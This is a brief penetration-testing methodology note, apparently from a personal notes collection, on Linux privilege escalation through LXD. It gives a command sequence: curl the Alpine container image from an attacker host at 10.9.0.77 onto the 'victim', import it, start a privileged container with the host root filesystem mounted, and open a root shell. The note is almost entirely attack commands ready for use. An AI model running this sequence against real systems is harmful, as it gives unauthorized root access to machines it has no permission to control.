<https://github.com/saghul/lxd-alpine-builder>

get the file over to victim:
curl <http://10.9.0.77:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz> -o /tmp/alpine-v3.13-x86_64-20210218_0139.tar.gz

lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage

lxc init myimage ignite -c security.privileged=true

lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

lxc start ignite

lxc exec ignite /bin/sh

![unnamed_b4de4e9d23434e629d97c8100eb2f41e](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Linux%20Privesc/Methodology/Attacks/less%20common/LXD%20Alpine%20UID%20privesc/{{notename}}-202605011742.png)
